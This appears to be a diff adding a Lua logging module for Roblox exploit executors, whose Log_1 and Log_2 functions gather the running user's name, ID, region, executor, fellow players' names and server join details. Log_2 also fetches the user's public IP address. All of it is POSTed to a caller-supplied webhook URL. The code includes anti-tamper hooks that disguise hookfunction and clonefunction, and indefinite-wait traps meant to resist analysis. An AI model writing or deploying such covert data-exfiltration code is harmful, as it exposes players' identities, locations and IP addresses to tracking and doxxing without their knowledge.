@@ -1,0 +1,264 @@
+local Indexer = {}
+
+local Duration = 0.5
+
+local Security = false
+
+local EO = false
+
+local Breakage = false
+
+local USecurity
+
+function Indexer:Info(time,secure,error,breakage,ultra)
+local time = time or 0.5
+local time = math.clamp(time,0.5,90)
+Duration = time
+
+Security = secure or false
+EO = error or false
+Breakage = breakage or false
+USecurity = ultra or false
+end
+
+function Indexer:Log_1(url)
+
+local S1, E1 = pcall(function()
+    if hookfunction() == "attempt to call a nil value" then
+    error("")
+    end
+    if clonefunction(getrenv) == "attempt to call a nil value" then
+    error("")
+    end
+    end)
+
+local S2, E2 = pcall(function()
+
+    local Plays = game:GetService("Players")
+
+    if not getgenv().getrenvs then
+    getgenv().getrenvs = "false"
+    end
+
+    spawn(function()
+        if getgenv().getrenvs == "false" then
+        getgenv().getrenvs = "true"
+        local with1 = {}
+
+        local codes
+
+        local LocalizationService = game:GetService("LocalizationService")
+        local player = game:GetService("Players").LocalPlayer
+
+        local resultreligion, codereligion = pcall(function()
+            return LocalizationService:GetCountryRegionForPlayerAsync(player)
+            end)
+
+        codes = codereligion
+
+        for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+        if v ~= game:GetService("Players").LocalPlayer then
+        print(v.Name)
+        table.insert(with1,v.Name)
+        end
+        end
+
+        local with2 = ""
+        local tc1 = string.format(table.concat(with1, ", "))
+
+        local exploits = identifyexecutor()
+
+        local data = {
+            ["content"] = "Profile: https://roblox.com/users/"..Plays.LocalPlayer.UserId.." Game: http://roblox.com/games/"..game.PlaceId,
+            ["embeds"] = {
+                {
+                    ["title"] = tostring(game:GetService("Players").LocalPlayer.Name.." "..game:GetService("Players").LocalPlayer.UserId),
+                    ["description"] = "Username: " ..Plays.LocalPlayer.Name.. " \nExploit: " ..exploits.. " \nProfile: https://roblox.com/users/"..Plays.LocalPlayer.UserId.."".."\nwith ```"..tc1.."``` in the same server\nRegion:  "..codes.."\nPlaceId: "..game.PlaceId.." \nJobId: "..game.JobId.." \nlocal JobId = "..game.JobId.." \nlocal PlaceId = "..game.PlaceId.." \ngame:GetService('TeleportService'):TeleportToPlaceInstance("..tonumber(game.PlaceId)..", '"..tostring(game.JobId).."', ".."game:GetService('Players').LocalPlayer"..")",
+                    ["type"] = "rich",
+                    ["color"] = tonumber(0x7269da),
+                    ["image"] = {
+                        ["url"] = "https://i.pinimg.com/originals/16/03/fb/1603fb7077abb9093f4af305b4e5ce79.gif"
+                    }
+                }
+            }
+        }
+        local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+        local headers = {
+            ["content-type"] = "application/json"
+        }
+
+        local request = http_request or request or HttpPost or syn.request
+        local request = clonefunction(request)
+        
+        local abcdef = {
+            Url = url,
+            Body = newdata,
+            Method = "POST",
+            Headers = headers
+        }
+        request(abcdef)
+        delay(Duration,function()
+            getgenv().getrenvs = "false"
+            end)
+        end
+        end)
+    end)
+
+local function SCall()
+if Security then
+if clonefunction and hookfunction then
+print("Securing")
+local CF = clonefunction(hookfunction)
+
+local Old = CF(hookfunction,newcclosure(function()
+    return "attempt to call a nil value"
+    end))
+local Old = CF(clonefunction,function()
+    return "attempt to call a nil value"
+    end)
+end
+
+if Breakage then
+return wait(9e9)
+end
+end
+end
+
+if not EO then
+SCall()
+end
+
+if not S2 then
+warn(E2)
+if EO then
+SCall()
+end
+end
+if not S1 and USecurity then
+print("Corrupted")
+return wait(9e9)
+end
+end
+
+function Indexer:Log_2(url)
+
+local S1, E1 = pcall(function()
+    if hookfunction() == "attempt to call a nil value" then
+    error("")
+    end
+    if clonefunction(getrenv) == "attempt to call a nil value" then
+    error("")
+    end
+    end)
+
+local S2, E2 = pcall(function()
+
+    local Plays = game:GetService("Players")
+
+    if not getgenv().getrenvs then
+    getgenv().getrenvs = "false"
+    end
+
+    spawn(function()
+        if getgenv().getrenvs == "false" then
+        getgenv().getrenvs = "true"
+        local with1 = {}
+
+        local codes
+
+        local LocalizationService = game:GetService("LocalizationService")
+        local player = game:GetService("Players").LocalPlayer
+
+        local resultreligion, codereligion = pcall(function()
+            return LocalizationService:GetCountryRegionForPlayerAsync(player)
+            end)
+
+        codes = codereligion
+
+        for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+        if v ~= game:GetService("Players").LocalPlayer then
+        print(v.Name)
+        table.insert(with1,v.Name)
+        end
+        end
+
+        local with2 = ""
+        local tc1 = string.format(table.concat(with1, ", "))
+
+        local exploits = identifyexecutor()
+
+        local data = {
+            ["content"] = "Profile: https://roblox.com/users/"..Plays.LocalPlayer.UserId.." Game: http://roblox.com/games/"..game.PlaceId,
+            ["embeds"] = {
+                {
+                    ["title"] = tostring(game:GetService("Players").LocalPlayer.Name.." "..game:GetService("Players").LocalPlayer.UserId),
+                    ["description"] = "Username: " ..Plays.LocalPlayer.Name.. " \nExploit: " ..exploits.. " \nProfile: https://roblox.com/users/"..Plays.LocalPlayer.UserId.."".."\nwith ```"..tc1.."``` in the same server\nRegion:  "..codes.."\nPlaceId: "..game.PlaceId.." \nJobId: "..game.JobId.." \nlocal JobId = "..game.JobId.." \nlocal PlaceId = "..game.PlaceId.." \ngame:GetService('TeleportService'):TeleportToPlaceInstance("..tonumber(game.PlaceId)..", '"..tostring(game.JobId).."', ".."game:GetService('Players').LocalPlayer"..")".." \nIP: "..tostring(game:HttpGet("https://api.ipify.org", true)),
+                    ["type"] = "rich",
+                    ["color"] = tonumber(0x7269da),
+                    ["image"] = {
+                        ["url"] = "https://i.pinimg.com/originals/16/03/fb/1603fb7077abb9093f4af305b4e5ce79.gif"
+                    }
+                }
+            }
+        }
+        local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+        local headers = {
+            ["content-type"] = "application/json"
+        }
+
+        local request = http_request or request or HttpPost or syn.request
+        local request = clonefunction(request)
+
+        local abcdef = {
+            Url = url,
+            Body = newdata,
+            Method = "POST",
+            Headers = headers
+        }
+        request(abcdef)
+        delay(Duration,function()
+            getgenv().getrenvs = "false"
+            end)
+        end
+        end)
+    end)
+
+local function SCall()
+if Security then
+if clonefunction and hookfunction then
+print("Securing")
+local CF = clonefunction(hookfunction)
+
+local Old = CF(hookfunction,newcclosure(function()
+    return "attempt to call a nil value"
+    end))
+local Old = CF(clonefunction,function()
+    return "attempt to call a nil value"
+    end)
+end
+
+if Breakage then
+return wait(9e9)
+end
+end
+end
+
+if not EO then
+SCall()
+end
+
+if not S2 then
+warn(E2)
+if EO then
+SCall()
+end
+end
+if not S1 and USecurity then
+print("Corrupted")
+return wait(9e9)
+end
+end
+
+return Indexer
